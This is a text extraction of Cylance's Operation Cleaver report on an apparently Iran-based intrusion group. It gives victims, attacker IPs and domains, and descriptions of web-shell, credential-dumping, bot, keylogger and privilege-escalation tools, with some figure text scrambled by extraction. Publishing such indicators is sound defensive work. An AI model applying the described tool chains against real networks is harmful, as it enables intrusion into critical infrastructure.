{
    "title": "Cylance_Operation_Cleaver_Report",
    "text": "5468696e6b204576696c2c20446f2ff0476f6f4\n#OP CLEA VER\n5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n2 5468696e6b204576696c2c20446f20476f6f64“Iran should be considered a first-tier cyber power.”\nGabi Siboni\nIsrael Institute for National Security Studies cybersecurity expert\n“Iran has rapidly gained near parity with the Chinese but \nmay be closer to the Russians in terms of swagger.”\nRetired Admiral William J. Fallon\nFormer Commander CENTCOM\n“Global critical infrastructure organizations need to take this \nthreat seriously. The Iranian adversary is real and they’re \ncoming, if not already here. ”\nMark Weatherford\nFormer Deputy Under Secretary for Cybersecurity at the US Department of Homeland Security\n“Y es, China and one or two others \ncan shut down our power grids.”\nAdmiral Michael Rogers\nDirector of the National Security Agency and head of US Cyber Command \n“The world has combated cyber threats by doing the same \nthing over and over again … It’s the definition of insanity.”\nJeff Moss\nCo-Chair DHS Community Resiliency Task Force, Founder of DEFCON and BlackHat\nJalal ad-Din Muhammad Rumi\n13th Century Persian poet, jurist, theologian and Suﬁ mystic \nEnglish translation: “Silence gives answers.”\n#OP CLEA VER\n3\n5468696e6b204576696c2c20446f2ff0476f6f4\nPREVENTION IS EVERYTHING\nA personal note from Cylance, CEO Stuart McClure\nOn February 24, 1989, United Flight 811 left Honolulu, Hawaii, on its way to Auckland, New Zealand, with \n364 souls on board. Somewhere between 23,000 and 24,000 feet an enormous explosion ejected nine \npassengers into the dark void over the Paciﬁc Ocean.1 This aviation disaster was later determined to have \nbeen caused by a simple design ﬂaw combined with the lack of corrective action. Boeing and the FAA had \nknown about this problem for over one year prior to the accident. The result: nine people lost their lives. The other 337 \npassengers plus 18 crew members who survived, live with the memory every day; all of it due to a  highly preventable  \ndesign ﬂaw. As a 19-year-old young adult, I was grateful to have survived but I had no idea how that single event would \nimpact my future in such a profound way. Much of my passion for cybersecurity can be directly attributed to that \nfateful day .\nThe United Flight 811 accident proves just how important it is to detect ﬂaws before tragedy strikes. Preventable \ndisasters like this are what motivates the Cylance team to create a safer world. We do everything we can to uncover \nthe ﬂaws in technologies before they damage the physical or cyber world. Our mission is simple: to protect the world.\nThis report is an attempt to deliver on that mission.\nAfter tracking hackers both personally and professionally for more than 26 years, there is no doubt in my mind \nthat the release of the information contained in the Operation Cleaver report is vital to the security of the world’s \ncritical infrastructure.\nThe focus of the Operation Cleaver report is on one particular Iranian team we’ve dubbed Tarh Andishan, the \ninfrastructure they utilize, as well as their tactics, techniques and procedures. Roughly translated, “Tarh Andishan” \nmeans “thinkers” or “innovators”. This team displays an evolved skillset and uses a complex infrastructure to perform \nattacks of espionage, theft, and the potential destruction of control systems and networks. While our investigation is \nongoing, and we presently have limited visibility inside many of the compromised networks, Cylance observed Tarh \nAndishan actively targeting, attacking, and compromising more than 50 victims since at least 2012. \nCylance is committed to responsible disclosure and has refrained from exaggeration and embellishment in this \nreport, limiting our content to only that which can be deﬁnitively conﬁrmed. However, we have speculated on the \npossible motivations behind these attacks, given our deep knowledge and understanding of the cyber landscape.  \nWe have made every effort to notify all affected entities prior to publishing this report.  Additionally, all personally \nidentiﬁable information about the members of Operation Cleaver has been withheld. We don’t care who the adversary \nis, where they work or reside, who they’re dating or what party photos they upload to Facebook – all we care about is \npreventing campaigns like Operation Cleaver from negatively affecting the real world.\nThis report is for the world’s cyber defenders – never give up!\nSincerely,\nStuart McClure\nCEO/President\nCylance, Inc.\nOPERATION\nCLEA VER\n4 5468696e6b204576696c2c20446f20476f6f64 TABLE OF CONTENTS\nExecutive Summary .........................................................................\nBackground ........................................................................................\nWhy the name “Cleaver”? .............................................................\nWhy Expose Iran Now? ..................................................................\nCritical Discoveries .........................................................................\nTargets & Victims  ............................................................................\nAttribution  .........................................................................................\n Attacker IP Addresses  ..............................................................\n Attacker Domains ......................................................................\n Tools & Software ........................................................................\n Tarh Andishan ............................................................................\n Members ......................................................................................\n     Teams ............................................................................................\nTactics, Techniques & Procedures (TTPs)  ...............................\n Initial Compromise .....................................................................\n Privilege Escalation & Pivoting  ...............................................\n Exﬁltration ....................................................................................\n Persistence ..................................................................................\nMitigation ..........................................................................................\nSpeculation: The Why ...................................................................\nConclusion ........................................................................................\nReferences ........................................................................................\nAbout Cylance .................................................................................\nCylance Products ...........................................................................\nCylance Services ............................................................................\nAcknowledgments ......................................................................\nThe Operation Cleaver Logo ......................................................\nAppendix A:   Indicators of Compromise (IOC) ........................ 5\n 6\n 8\n 8\n 9\n12\n17\n18\n19\n20\n24\n26\n30\n31\n32\n36 \n41\n47\n60\n62\n65\n67\n68\n69\n70\n71\n72\n73#OP CLEA VER\n5\n5468696e6b204576696c2c20446f2ff0476f6f4\nEXECUTIVE SUMMARY\nSince at least 2012, Iranian actors have directly attacked, \nestablished persistence in, and extracted highly sensitive \nmaterials from the networks of government agencies and major \ncritical infrastructure companies in the following countries: \nCanada, China, England, France, Germany, India, Israel, \nKuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South Korea, \nTurkey, United Arab Emirates, and the United States. \nIran is the new China.\nOperation Cleaver has, over the past several years, conducted a signiﬁcant global surveillance \nand inﬁltration campaign. To date it has successfully evaded detection by existing security \ntechnologies. The group is believed to work from Tehran, Iran, although auxiliary team \nmembers were identiﬁed in other locations including the Netherlands, Canada, and the UK. \nThe group successfully leveraged both publicly available, and customized tools to attack and \ncompromise targets around the globe. The targets include military, oil and gas, energy and \nutilities, transportation, airlines, airports, hospitals, telecommunications, technology, education, \naerospace, Defense Industrial Base (DIB), chemical companies, and governments.\nDuring intense intelligence gathering over the last 24 months, we observed the technical \ncapabilities of the Operation Cleaver team rapidly evolve faster than any previously observed \nIranian effort. As Iran’s cyber warfare capabilities continue to morph,2 the probability of an attack \nthat could impact the physical world at a national or global level is rapidly increasing.3 Their \ncapabilities have advanced beyond simple website defacements, Distributed Denial of Service \n(DDoS) attacks, and Hacking Exposed  style techniques. \nWith minimal separation between private companies and the Iranian government, their  modus \noperandi  seems clear: blur the line between legitimate engineering companies and state-\nsponsored cyber hacking teams to establish a foothold in the world’s critical infrastructure.\nIran’s rising expertise, along with their choice of victims, has compelled us to release this report \nsooner than we would have liked in order to expose Operation Cleaver to the world. The \nevidence and indicators of compromise we provide in this report will allow potentially unaware \nvictims  to detect and eliminate Cleaver’s incursions into their networks. OPERATION\nCLEA VER\n6 5468696e6b204576696c2c20446f20476f6f64BACKGROUND\nIran has been severely impacted by debilitating and extremely \nadvanced malware campaigns since at least 2009. Famous \nexamples of these efforts include industrial sabotage via \nStuxnet (2009 - 2010), and espionage with Duqu (2009 - 2011) \nas well as Flame (2012). These campaigns have targeted Iran’s \nnuclear program, and oil and gas operations. Stuxnet was an \neye-opening event for Iranian authorities, exposing them to the \nworld of physical destruction via electronic means.\nHacking campaigns sourced out of Iran are nothing new. Since the early 2000’s, the information \nsecurity industry as a whole has tracked teams like the Iranian Cyber Army, which mainly focuses \non patriotic hacking (website defacements). After the release of Stuxnet, Iran’s motivations appear \nto have shifted. Retaliation for Stuxnet began almost immediately in 2011 with campaigns like the \ncertiﬁcate compromises of Comodo and DigiNotar. These attacks served as a warning, showcasing \nthe rapid evolution of Iran’s hacking skills. \nA major retaliation came in the form of 2012’s Shamoon campaign, which impacted RasGas and \nSaudi Aramco. It’s estimated that Shamoon impacted over 30,000 computer endpoints and cost \nthe affected companies tens-of-thousands of hours recovering from the attacks. The direct ﬁnancial \nimpact from this retaliation and amount of downtime experienced were staggering. Shamoon was \ntruly a watershed event for security defenders. It was the ﬁrst glimpse into the real capabillity and \nintention of Iranian cyber operations. We see the same motivation and intent here in Operation \nCleaver: establishing a beachhead for cyber sabotage. \nWe saw further Iranian backlash in late 2012 and early 2013 in the form of Operation Ababil’s \nDistributed Denial of Service (DDoS) attacks against US banks. These attacks were debilitating and \nimpacted the availability of online banking services. Yet more backlash was witnessed with FireEye’s \nexposure of Operation Saffron Rose, an espionage campaign executed by the Ajax Security Team \nin 2014. In May 2014, evidence emerged of a highly targeted waterhole attack that leveraged social \nmedia, dubbed Operation Newscaster, which was uncovered by iSight Partners.\nIn June 2013, Israeli Prime Minister Benjamin Netanyahu accused Iran of carrying out “non-stop” \nattacks on “[Israel’s] vital national systems” including “water, power and banking”4. The following \nSeptember of 2013, the Wall Street Journal accused Iran of hacking into unclassiﬁed U.S. Navy \ncomputers in San Diego’s NMCI (Navy Marine Corp Intranet),5 which we can conﬁrm was part of \nOperation Cleaver.#OP CLEA VER\n7\n5468696e6b204576696c2c20446f2ff0476f6f4\nFigure 1: The sequence of major Iran-centric attacks; either as victims (left) or attackers (right).While previously reported operations attributed to Iran have largely focused on Defense Industrial \nBase (DIB) companies, the United States Federal Government, or targets in Middle Eastern countries, \nOperation Cleaver has instead focused on a wide array of targets, including energy producers \nand utilities, commercial airlines and airports, military intelligence, aerospace, hospitals, and \neven universities – with only ten of the targets based in the United States. Such broad targeting \ndemonstrates to the world that Iran is no longer content to retaliate against the US and Israel alone. \nThey have bigger intentions: to position themselves to impact critical infrastructure globally.\nSHAM  Nduqu~\nAbabilOPERA TIONNEWSCAST ERSaﬀr  n RoseFLME2010DigiNotarStUXNEt201120122013\nNMC I\nNAVY MARINE CORPS INTRANE TMMCMMMIMINCCNMC INMCMMCIIICCCMMM2014ORIGIN ATIONRETALIATION\nGAUSS5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n8 5468696e6b204576696c2c20446f20476f6f64WHY THE NAME CLEAVER?\nThe string cleaver is found several times in a variety of custom software used in Operation \nCleaver, including:\n Numerous references inside the namespaces of their custom bot code     \n codenamed TinyZBot, e.g.:\n \n e:\\projects\\cleaver\\trunk\\zhoupin_ cleaver \\obj\\x86\\release\\netscp.pdb\n \n PDBs associated with the hacker name “Jimbp”, e.g.:\n \n c:\\users\\jimbp\\desktop\\binder_1 - for cleaver \\binder_1\\obj\\x86\\release\\setup.pdb\n \n PDBs associated with the keystroke loggers, artifacts, and numerous other tools, e.g.:\n \n e:\\Projects\\ Cleaver \\trunk\\MainModule\\obj\\Release\\MainModule.pdb\nWHY EXPOSE IRAN NOW?\nWe believe our visibility into this campaign represents only a fraction  of Operation Cleaver’s full \nscope. We believe that if the operation is left to continue unabated, it is only a matter of time \nbefore the world’s physical safety is impacted by it. While the disclosure of this information will \nbe a detriment to our ability to track the activity of this group, it will allow the security industry as \na whole to defend against this threat. As such, we are exposing this cyber campaign early in an \nattempt to minimize additional real-world impact and prevent further victimization.1\n2\n3#OP CLEA VERCRITICAL DISCOVERIES5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n10 5468696e6b204576696c2c20446f20476f6f64CRITICAL DISCOVERIES\nIranian Actors Are Behind Operation Cleaver\n• Persian hacker names are used throughout the campaign including: Salman Ghazikhani, \nBahman Mohebbi, Kaj, Parviz, Alireza, and numerous others.\n• Numerous domains used in the campaign were registered in Iran.\n• Infrastructure leveraged in the attack was registered in Iran to the corporate entity Tarh \nAndishan, which translates to “invention” or “innovation” in Farsi.\n• Source netblocks and ASNs are registered to Iran.\n• Hacker tools warn when their external IP address traces back to Iran.\n• The infrastructure is hosted through Netafraz.com , an Iranian provider out of Isfahan, Iran.\n• The infrastructure utilized in the campaign is too signiﬁcant to be a lone individual or a small \ngroup. We believe this work was sponsored by Iran.\nOperation Cleaver Targets Critical Infrastructure Around the World\n• US Military targets including NMCI in October 2013.5 Conﬁrmed targeting of global \ngovernment entities.\n• Networks and systems targeted in critical industries like energy and utilities, oil and gas, and \nchemical companies.\n• Assets (both cyber and physical) and logistics information were compromised at major airline \noperators, airports, and transportation companies.\n• Various global telecommunications, technology, healthcare, aerospace, and defense \ncompanies were breached as part of the operation.\n• Conﬁdential critical infrastructure documents were harvested from major educational \ninstitutions around the world.\nIran’s Cyber Hacking Skills Have Evolved\n• Initial compromise techniques include SQL injection, web attacks, and creative deception-\nbased attacks – all of which have been implemented in the past by Chinese and Russian \nhacking teams.\n• Pivoting and exploitation techniques leveraged existing public exploits for MS08-067 and \nWindows privilege escalations, and were coupled with automated, worm-like propagation \nmechanisms.\n• Customized private tools with functions that include ARP poisoning, encryption, credential \ndumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and \nSMB communications, network interface sniffing, and keystroke logging.\n• The ability to build customized tools to compromise any target they choose.#OP CLEA VER\n11\n5468696e6b204576696c2c20446f2ff0476f6f4\nIndicators of Compromise (IOC)\n• Private signing certiﬁcates of one victim were captured allowing the Operation Cleaver team to \ncompromise the entirety of their organization.\n• Over the past two years, Cylance has collected over 8GB of data including over 80,000 ﬁles of \nexﬁltrated data, hacker tools, victim logs, and highly sensitive reconnaissance data.\n• Data from sinkholed command and control servers has allowed us to track this active campaign.\n• Cylance is releasing more than 150 IOCs and samples associated with the Cleaver campaign to \nempower the security community to detect existing compromises in their own organizations, as \nwell as potentially block future attacks from these teams. \nSpeculation\n \n• This campaign continues Iran’s retaliation for Stuxnet, Duqu, and Flame.\n• This is a state-sponsored campaign.\n• There is a possibility that this campaign could affect airline passenger safety.\n• This campaign’s intentions may be to damage Industrial Control Systems (ICS), Supervisory \nControl and Data Acquisition (SCADA) systems, and impact Critical Infrastructure and Key \nResources (CIKR).\n• This campaign could be a way to demonstrate Iran’s cyber capabilities for additional \ngeopolitical leverage, due to the breadth and depth of their global targets.\n• There is an intense focus on CIKR companies in South Korea, which could give Iran additional \nclout in their burgeoning partnership with North Korea. In September 2012, Iran signed an \nextensive agreement for technology cooperation agreement with North Korea, which would \nallow for collaboration on various efforts including IT and security.6\n• Iran is recruiting from within the universities and potentially using ‘hackers for hire’.7#OP CLEA VERTARGETS & VICTIMS\n5468696e6b204576696c2c20446f20476f6f645468696e6b204576696c2c20446f2ff0476f6f4\n#OP CLEA VER\n13TARGETS & VICTIMS\nThe Cleaver team targets some of the most sensitive global critical infrastructure companies in the \nworld, including military, oil and gas, airlines, airports, energy producers, utilities, transportation, \nhealthcare, telecommunications, technology, manufacturing, education, aerospace, Defense \nIndustrial Base (DIB), chemical companies and governments. Countries impacted include Canada, \nChina, England, France, Germany, India, Israel, Kuwait, Mexico, Pakistan, Qatar, Saudi Arabia, South \nKorea, Turkey, United Arab Emirates, and the US. \nThe following is a breakdown by country of which industries were targeted and/or victimized:\nCanada\n- Energy & Utilities\n- Oil & Gas\n- Hospitals\nChina\n- Aerospace\nEngland\n- Education\nFrance\n- Oil & Gas\nGermany\n - Telecommunications\nIndia\n- Education\nIsrael\n- Aerospace\n- EducationKuwait\n- Oil & Gas\n- Telecommunications\nMexico\n- Oil & Gas\nPakistan\n- Airports\n- Hospitals\n- Technology\n- Airlines\nQatar\n- Oil & Gas\n- Government\n- Airlines\nSaudi Arabia\n- Oil & Gas\n- AirportsSouth Korea\n- Airports\n- Airlines\n- Education\n- Technology\n- Heavy Manufacturing\nTurkey\n- Oil & Gas\nUnited Arab Emirates\n- Government\n- Airlines\nUnited States\n- Airlines\n- Education\n- Chemicals\n- Transportation\n- Energy & Utilities\n- Military/Government\n- Defense Industrial BaseOPERATION\nCLEA VER\n14 5468696e6b204576696c2c20446f20476f6f64\nCleaver’s level of access into each organization varied greatly, including completely compromised \nsystems and networks, Active Directory domain controllers and credentials, compromised data \nrepositories and stolen VPN credentials.\nCompromised systems include Microsoft Windows web servers running IIS and ColdFusion, \nApache with PHP, many variants of Microsoft Windows desktops and servers, and Linux servers. \nCompromised network infrastructure included Cisco VPNs as well as Cisco switches and routers. \nUnlike Stuxnet, no exotic exploitations (such as 0-days) were observed.\nWithin our investigation, we had no direct evidence of a successful compromise of speciﬁc\nIndustrial Control Systems (ICS) or Supervisory Control and Data Acquisition (SCADA) networks, but\nCleaver did exﬁltrate extremely sensitive data from many critical infrastructure companies allowing \nthem to directly affect the systems they run. This data could enable them, or affiliated organizations, \nto target and potentially sabotage ICS and SCADA environments with ease.\nWe discovered over 50 victims in our investigation, distributed around the globe. Ten of these \nvictims are headquartered in the US and include a major airline, a medical university, an energy \ncompany specializing in natural gas production, an automobile manufacturer, a large defense \ncontractor, and a major military installation. The four targets in Israel and the ﬁve targets in Pakistan \nare comprised of education, aerospace, airports, airlines, healthcare and technology. Further victims \nwere identiﬁed in numerous Middle Eastern countries as well as ones in Northern Europe including \nthe UK, France, and Germany. Central America was not immune either with a large oil and gas \ncompany on the list. In fact, oil and gas was a particular focal point for the Cleaver team, going after \nno less than nine of these companies around the world.\nUniversities were targeted in the US, India, Israel, and South Korea. The attackers targeted research \nefforts, student information, student housing, and ﬁnancial aid systems. They had a penchant for \npictures, passports, and any specifc identifying information.\nPerhaps the most bone-chilling evidence we collected in this campaign was the targeting and \ncompromise of transportation networks and systems such as airlines and airports in South Korea, \nSaudi Arabia and Pakistan. The level of access seemed ubiquitous: Active Directory domains \nwere fully compromised, along with entire Cisco Edge switches, routers, and internal networking \ninfrastructure. Fully compromised VPN credentials meant their entire remote access infrastructure \nand supply chain was under the control of the Cleaver team, allowing permanent persistence \nunder compromised credentials. They achieved complete access to airport gates and their security \ncontrol systems, potentially allowing them to spoof gate credentials. They gained access to PayPal \nand Go Daddy credentials allowing them to make fraudulent purchases and allowed unfettered \naccess to the victim’s domains. We were witnessed a shocking amount of access into the deepest \nparts of these companies and the airports in which they operate.#OP CLEA VER\n15\n5468696e6b204576696c2c20446f2ff0476f6f4\nFigure 2:  Geographic distribution of victims, as determined by the global headquarters of the parent \ncompany or organization breached.\n      \n   TARGE T LOCA TIONSCOUNTRIE S TARGE TED\n1. Canada - Calgary\n2. Canada - Hamilton\n3. China - Beijing\n4. England - Oxford\n5. France - P aris\n6. Germany - Dusseldor f\n7. Germany - Frankfurt \n8. India - New Delhi (2) \n9. Israel - Haifa (3) \n10. Israel - R ehovot\n11. Kuwait - Ahmadi\n12. Kuwait - Kuwait City25. UAE - Abu Dhab i\n26. U AE - Al Garhoud\n27. USA - California - Los Angeles (2)\n28. USA - California - San Dieg o\n29. USA - California - San Jose\n30. USA - Michigan - Dearborn\n31. USA - Texas  - Houston (2)\n32. USA - Texas  - Fort Worth\n33. USA - T exas  - Southlak e\n34. USA - Virginia - Fairfax\n35. USA - Virginia - McL ean13. Mexico - Mexico City\n14. Pakistan - K arachi  (2)\n15. Pakistan - L ahore\n16. Pakistan - Multan\n17. Pakistan - Peshawar\n18. Qatar - Doha (4)\n19. Saudi Arabia - Dhahran\n20. Saudi Arabia - Jeddah\n21. South K orea - Incheo n\n22. South Korea - Goyang-si\n23. South K orea - Seoul (7)\n24. T urkey - Antaly a1 2\nA\n13AAA\nA4675B\nB\nBBB\nBB3B2321\n292827313133\n322735302625181220111091716 8141581924\nA B22\n34\nOPERATION\nCLEA VER\n16 5468696e6b204576696c2c20446f20476f6f64\nFigure 3:  Number of Cleaver victims by the level of access obtained as well as the level of critical impact potential.LEVEL OF ACCESS\nLEVEL OF CRITICA L IMPA CTHIGH\nMED IUM\nLOW\nTECHNOLOGY\nAEROSPACE\nEDUCATION\nCHEMICALS\nHOSPITALS\nTELECOMMUNICATIONS\nTRANSPORTATION\n GOVERNMENT\nOIL & GAS\nAIRLINES\nAIRPORTS\nENERGY & UTILITIES\nMANUFACTURING\nDEFENSE INDUSTRIALINDUSTRIE S TARGE TED#OP CLEA VERATTRIBUTION5468696e6b204576696c2c20446f20476f6f64OPERATION\nCLEA VER\n18 5468696e6b204576696c2c20446f20476f6f64ATTRIBUTION\nDespite today’s trend toward attacker attribution, we believe \nit offers little real beneﬁt to the day-to-day cyber defender. \nHowever, in this report we offer our observations on the \nsources of Operation Cleaver in order to beneﬁt those that \nrely on attribution such as Law Enforcement. \nOperation Cleaver is believed to consist of at least 20 \nhackers and developers, collaborating on projects and \nmissions to support Iranian interests. Many of the targets were \npredominately English-speaking and a majority of the team \nmembers were capable of reading and writing in English. We \npresent evidence that this team is operating, at least in part, \nout of Iran and in the interests of Iran. The skills and behavior \nof the Operation Cleaver teams are consistent with, and in \none case surpasses, Iran’s cyber capabilities as we know \nthem today.\nFor a complete list of IPs and domains related to this \ncampaign, please refer to the Indicators of Compromise  \nsection.\nATTACKER IP ADDRESSES\nOver the course of multiple incident response engagements related to Operation Cleaver, we \nwere able to identify a small set of IP addresses which were commonly used during the initial \nstages of an attack.\nThe IP address 78.109.194.114  served as a source for one of the primary attackers. \nThey were observed conducting SQL injections, controlling backdoors, as well as exﬁltrating \ninformation using this address, and the address appears in multiple software conﬁgurations \nrecovered from staging servers over a period of time.\n GeoIP Location: Iran\n Net block: 78.109.194.96 - 78.109.194.127\n Owner: Tarh Andishan\n Email: tarh.andishan(at)yahoo.com\n Phone: +98-21-22496658\n NIC-Handle: TAR1973-RIPEFigure 4: The logo of the Army of the \nGuardians of the Islamic Revolution, \nalso known as the Islamic Revolutionary \nGuard Corps (IRGC).#OP CLEA VER\n19\n5468696e6b204576696c2c20446f2ff0476f6f4\nThis IP address was also observed in multiple software conﬁgurations. This particular net block \nwas used over an extended period of time, indicating these were under the Cleaver team’s \nphysical control. Additionally, prior netblocks used by the same team demonstrated to us that \nthis wasn’t simply a case of proxying or “island hopping”. For more information see the Tarh \nAndishan  section of this report.\nThe IP address 159.253.144.209  was a source for a secondary attacker in various \ncompromises. They were observed conducting SQL injection attacks. While this IP was this \nregistered in the Netherlands, we believe they used Softlayer’s Citrix demo environment to \nlaunch these attacks which is consistent with proxying or “island hopping”. \n GeoIP Location: Netherlands\n Net block: 159.253.144.208 - 159.253.144.223\n ASN: Softlayer Technologies, Inc.\n IP Location: Netherlands, Amsterdam with Iranian sourcing.\nATTACKER DOMAINS\nA number of Cleaver’s attack methods require a persistent server. In many cases, these servers \nwere referenced by domain names. The following malicious domains are operated by this \norganization and are grouped by the registrant’s email address.\ndavejsmith200(at)outlook.com\n• Teledyne-Jobs.com\n• DownloadsServers.com\n• NorthropGrumman.net\n• MicrosoftMiddleAst.com\nsalman.ghazikhani(at)outlook.com  \n• Doosan-Job.com\nbtr.8624(at)yahoo.com\n• GoogleProductUpdate.net\n• WindowsCentralUpdate.com\n• WindowsUpdateServer.com\n• DriverCenterUpdate.com\nAs is typical with malicious domains, the Whois data for most of these domains contained falsiﬁed \ninformation. \nWe managed to obtain a large collection of the internally developed tools used by the Cleaver \nteam, many of which were developed by its members. Due to operational security failures, these \ntools contain information that provided us insight into their organization and operations.azlinux73(at)gmail.com\n•    MicrosoftServerUpdate.com\n•    WindowsSecurityUpdate.com\n•    WindowsServerUpdate.com\ndomain(at)netafraz.com\n•    EasyResumeCreatorPro.com\n•    MicrosoftWindowsResources.com\nmsnhst(at)microsoft.com\n•    MicrosoftWindowsUpdate.netOPERATION\nCLEA VER\n20 5468696e6b204576696c2c20446f20476f6f64TOOLS & SOFTWARE\nShell Creator 2\nIn the tool named Shell Creator 2, there are three main components. The creator generates \nan ASPX web shell using user input as well as a collection of templates. The web shell could \nthen be installed via xp_cmdshell , or any other method which would grant the attacker write \naccess. The web shell is accessible by the shell client directly. \nThe shell client is a portion of Shell Creator 2 that was not designed to be run on a compromised \ncomputer. We originally located it on a staging server being utilized for multiple attacks as well as \na tool for sharing data between members of the organization’s team.\nThe shell client, which is developed in Java and is easily decompiled, is a simple interface with \na feature to protect the operator from making a critical mistake. When executed, and before \nany connection to an instance of the web shell is initiated, the shell client communicates with \nfreegeoip.net  in order to get the external IP address of the current user. The country of origin \nis then shown to the user, to inform them of what country it appears they are connecting from. \nThe assumed purpose of this feature is to ensure that a proper proxy is in use, and the real origin \nof the attacker is not revealed.\nAfter decompiling the shell client, we found the following code segment controlling the display of \nthis IP location information.\nThis code handles the XML response from freegeoip.net , and displays the information \nas different colors based on different attributes. For instance, if the string “ERROR” is in the \nresponse, the text is displayed with the color magenta. If the string IRAN is in the response, the \ntext is displayed with the color red. It should be noted that no other country name contains the \nsubstring IRAN.\nFigure 5:  Java source code showing how Shell Creator 2 distinguishes between a source IP address \ncoming from Iran (red) versus any other country (green).#OP CLEA VER\n21\n5468696e6b204576696c2c20446f2ff0476f6f4\nShell Creator 2 (cont.)\nNet Crawler\nNet Crawler is a tool developed in C# that exhibits worm-like behavior in order to gather cached \ncredentials from any and all accessible computers on an infected network. This is done with \nWindows Credential Editor (WCE) and Mimikatz in combination with PsExec. Different versions of \nthis malware contain ASCII art which names the authoring group as Zhoupin (in “leetspeak” as \n“Zh0up!n”).\nFor more information on Net Crawler, see the Tactics, Techniques and Procedures  section.\nFigure 6: Shell Creator 2 alerts the user in red when the IP being used can be sourced to Iran.\nFigure 7: Shell Creator 2 notiﬁes the user in green  when their source IP address is not Iran.\nFigure 8: Net Crawler version 1.0 has ASCII art showing \nthe use of “Zh0up!n” in the campaigns tools.\nFigure 9: Updated ASCII art found in Net \nCrawler tool shows a version of “Zh0up!n” \nshortened to simply “Zh0”.OPERATION\nCLEA VER\n22 5468696e6b204576696c2c20446f20476f6f64TinyZBot\nTinyZBot is a bot written in C# and developed by the Cleaver team. It is the longest developed \nmalware family discovered by this group, and has been used in campaigns for close to two \nyears. How it operates can vary greatly from version to version. For a detailed technical analysis \nof TinyZBot, see the Tactics, Techniques and Procedures  section. As TinyZBot is developed in \nC#, many versions can be decompiled to code very similar to their originals, including names \nof namespaces. Many versions were obfuscated with a legitimate tool for developers named \nSmartAssembly, which makes the recovery of some names implausible.\nWe obtained multiple versions from which we were able to recover many of the original names of \nvariables and namespaces. In a number of these samples, the primary namespace for TinyZBot \nis named Zhoupin_Cleaver . In every version of TinyZBot that is not obfuscated, there is a \ncode base referred to as Cleaver. This code base is also shared in other malware developed by \nthis organization, such as Csext.\nPrivEsc\nPrivEsc is a blatant plagiarism of an existing exploit for Microsoft Windows released in January \n2010 called MS10-015, “Vulnerabilities in Windows Kernel Could Allow Escalation of Privilege”, \npopularly known as the KiTrap0D exploit which was released publicly. The Cleaver team clearly \nmodiﬁed the source code and compiled a new version. The only detectable modiﬁcation was to \nchange the original author’s name to instead display the following:\nZhopin Exploit Team\nThis is not the only case of this team relabeling others’ work as their own.\nLogger Module\nLogger module is a component of the PVZ (PVZ is shorthand for Parviz, one of the members of \nthe Cleaver team) bot tool chain. When executed, it will capture the user’s keystrokes and save \nthem to a location which PVZ bot then exﬁltrates. The logger module binary’s ﬁle description \nvalue is the following: \nye file khube DG. ba in ham kari nadashte bashin\nRoughly translated from Persian, this text says:\nDG is a good file, don’t bother with this#OP CLEA VER\n23\n5468696e6b204576696c2c20446f2ff0476f6f4\nLogger Module (cont.)\nThis text could potentially be a note intended to stay internal, or could be an attempt to persuade \nan unsuspecting victim to assume the ﬁle is not malicious. The Product Name value is GOOD FILE . \nFor more information on the PVZ bot tool chain, see the Tactics, Techniques, and Procedures  \nsection.\nCCProxy\nCCProxy is a publicly available proxy server for Windows, which can handle a variety of protocols. \nWe do not believe that this organization was involved in the development or modiﬁcation of \nCCProxy, but they have been observed using it. We recovered a CCProxy conﬁguration, which \nexposed various operational details. \nThe conﬁguration allowed for remote \nconnections, limited by a username as well as a \nlimited IP range. The username was User-001 , \nwhich is the default value. The limited IP range \ncovered one IP: 78.109.194.114 . \nThis IP address is located in Iran, and is owned by \nTarh Andishan. \nThe conﬁguration also indicates which address\nthe CCProxy server should listen on for incoming\nconnections such as web (80) and mail (25).\nFigure 10 (above):  CCProxy conﬁguration ﬁle \nusing the hardcoded IP address registered to Tarh \nAndishan.\nFigure 11 (left):  CCProxy conﬁguration ﬁle showing the \nuse of web and mail as listening ports.\nOPERATION\nCLEA VER\n24 5468696e6b204576696c2c20446f20476f6f64NMAP Log\nLog output from the network port scanning application NMAP was recovered from a staging \nserver. This log was generated during the usage of the nbrute utility, which brute-forces network \ncredentials and relies on NMAP to do so. The header of this NMAP log indicates that the computer \nused to run nbrute/nmap was set to Iran Daylight Time at the time of execution.\nStarting Nmap 6.25 at 2012-08-17 09:18 Iran Daylight Time\nWith no known victims located in Iran, it is likely that this was executed on an attacker’s computer, \nand not on a victim’s computer.\nSquid Conﬁguration\nA conﬁguration ﬁle for a Squid proxy server was recovered.\nThe net range of 78.109.194.114/28 was inserted into the allowed local networks with an RFC \ncomment appended in order to make it look like it was part of the default conﬁguration. It is likely \nthis is the same reason a /28 net range was used, in order to not look like it was intended to only \nallow one IP. This would give the same access to resources accessible from the Squid proxy server \nto this Iranian IP address.\nTARH ANDISHAN\nTarh Andishan is listed as the registrant for a number of small net blocks based upon the email \naddress tarh.andishan(at)yahoo.com .  The net blocks appear to rotate over time and \nregistrant information is altered to accommodate ongoing operations and avoid potential public \nexposure. \nFigure 12: Squid conﬁguration ﬁle showing the use of Tarh Andishan’s IP address.#OP CLEA VER\n25\n5468696e6b204576696c2c20446f2ff0476f6f4\nTARH ANDISHAN (cont.)\nThe networks are included below as well as the last time that net block was observed as active.\n \n • 78.109.194.96/27 - Current \n • 217.11.17.96/28 - 10/22/2014 \n • 81.90.144.104/29 - 10/5/2014 \n • 31.47.35.0/24 – 11/2012\nThere are many seemingly legitimate Tarh Andishan related companies inside Tehran, but strong\nconnections to Iranian backing have been difficult to prove deﬁnitively. “Tarh Andishan” is often \ntranslated as “Thinkers”, “Innovators” and “Inventors”. \nThe net blocks above have strong associations with state-owned oil and gas companies. These \ncompanies have current and former employees who are ICS experts. \nTarh Andishan has been suspected in the past of launching attacks in the interest of Iran. The \noperators of the blog IranRedLine.org, which comments on Iran’s nuclear weapons efforts, has \nmentioned in multiple posts having been the target of debilitating brute-force authentication attacks \nfrom IP addresses registered to the same Tarh Andishan team found in Cleaver.\nIn one of IranRedLine.org’s blog posts8, the author speculates on Tarh Andishan’s involvement \nwith the Iranian government by showing close proximity to SPND, the Organization of Defensive \nInnovation and Research; however, the phone number listed under the registrant contact \ninformation has yet to be completely validated.\nFigure 13: This image from IranRedLine.org demonstrates Tarh Andishan’s probably fabricated Whois \naddress to the proximity to Iran’s SPND (Organization of Defensive Innovation and 